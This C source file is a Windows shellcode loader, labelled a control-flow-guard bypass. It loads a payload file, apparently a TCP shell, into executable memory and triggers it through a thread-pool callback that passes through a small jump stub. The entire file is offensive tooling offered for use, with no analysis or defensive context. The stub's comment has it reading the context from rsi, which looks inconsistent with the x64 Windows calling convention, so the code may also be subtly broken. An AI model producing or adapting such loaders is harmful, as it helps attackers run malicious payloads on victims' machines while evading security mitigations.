#include <windows.h>
#include <stdio.h>
#include <string.h>
#pragma comment(lib, "kernel32.lib")

int main(void) {
    printf("=== TrySubmitThreadpoolCallback CFG Bypass ===\n");
    FILE* f = fopen("tcp_windows_amd64.bin", "rb");
    if (!f) { printf("[-] shellcode not found\n"); return 1; }
    fseek(f, 0, SEEK_END);
    long sc_len = ftell(f);
    fseek(f, 0, SEEK_SET);
    unsigned char* sc = (unsigned char*)VirtualAlloc(
        NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!sc) { printf("[-] VirtualAlloc failed\n"); fclose(f); return 1; }
    fread(sc, 1, sc_len, f);
    fclose(f);
    printf("[+] Shellcode: %ld bytes @ %p\n", sc_len, sc);

    // ABI transition stub: mov rax,[rsi]; jmp rax
    unsigned char stub[32] = {
        0x48, 0x8B, 0x06,       // mov rax, [rsi]
        0xFF, 0xE0              // jmp rax
    };
    unsigned char* stub_mem = (unsigned char*)VirtualAlloc(
        NULL, 32, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!stub_mem) { printf("[-] stub alloc failed\n"); return 1; }
    memcpy(stub_mem, stub, sizeof(stub));
    printf("[+] Stub @ %p\n", stub_mem);

    // Context: pointer-to-pointer to shellcode
    void** ctx = (void**)LocalAlloc(LPTR, sizeof(void*));
    ctx[0] = sc;
    printf("[+] ctx @ %p -> %p\n", ctx, sc);

    BOOL ok = TrySubmitThreadpoolCallback(
        (PTP_SIMPLE_CALLBACK)stub_mem, ctx, NULL);
    if (!ok) {
        printf("[-] TrySubmitThreadpoolCallback failed (%lu)\n", GetLastError());
        return 1;
    }
    printf("[+] Submitted. Waiting 2s...\n");
    fflush(stdout);
    Sleep(2000);
    printf("[+] Done.\n");
    return 0;
}
